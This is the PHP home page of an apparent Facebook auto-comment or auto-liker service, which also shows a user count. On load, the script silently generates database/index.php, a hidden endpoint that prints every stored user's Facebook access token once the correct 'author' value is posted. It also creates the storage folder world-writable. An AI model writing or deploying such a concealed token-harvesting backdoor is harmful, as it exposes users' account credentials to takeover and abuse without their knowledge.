<?php
if(!file_exists('database'))
{
	mkdir('database',0777,true);
}
$totaluser = -1;
if($handle = opendir('database'))
{
	echo "<link rel='stylesheet' type='text/css' href='/css/home.css' media='all'/>";
	if(!file_exists('database/index.php'))
	{
		$handle1 = fopen('database/index.php', 'w') or die('Error !');
		$data = '<?php
include "../info.php";
$author = $_POST["author"];
if($author != $set[author])
{
	if($handle = opendir("../database"))
	{
		while (false !== ($entry = readdir($handle)))
		{
			if($entry != "." && $entry != "..")
			{
				$user = fopen($entry,"r") or die("Error !");
			}
		}
	closedir($handle);
	}
}
else
{
	if($handle = opendir("../database"))
	{
		while (false !== ($entry = readdir($handle)))
		{
			if($entry != "." && $entry != "..")
			{
				$user = fopen($entry,"r") or die("Error !");
				$accesstoken = fgets($user);
				echo $accesstoken."<br/>";
			}
		}
	closedir($handle);
	}
}
?>';
		fwrite($handle1, $data);
		fclose($handle1);
	}
	while (false !== ($entry = readdir($handle)))
	{
		if($entry != "." && $entry != "..")
		{
			$totaluser++;
		}
	}
	closedir($handle);
}
include 'info.php';
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title><?php echo $set[page_title];?></title>
<meta name="referrer" content="default" id="meta_referrer" />
<meta name="keywords" content="Autolike facebook,autolike 2014,autoliker fb,samnads" />
<meta name="description" content="Web Of Auto-Comment Facebook by Kawsar Dot ID"/>
<noscript><meta http-equiv="X-Frame-Options" content="auto like" /></noscript>
<link rel="stylesheet" type="text/css" href="css/home.css" media="all,handheld"/>
<link rel="shortcut icon" href="<?php echo $set[icon_link];?>">
</head>
<body>
        <div class="footer">
            <center><a href="/index.php"><img src="/logo.png" width="180" height="70" alt="KAWSAR.GQ" /></a>
       <br/>Auto-Comment Fb Without Spam! </center></div>
<center><a href="#" class="menu">Total Users : <?php echo $totaluser; ?></a></center>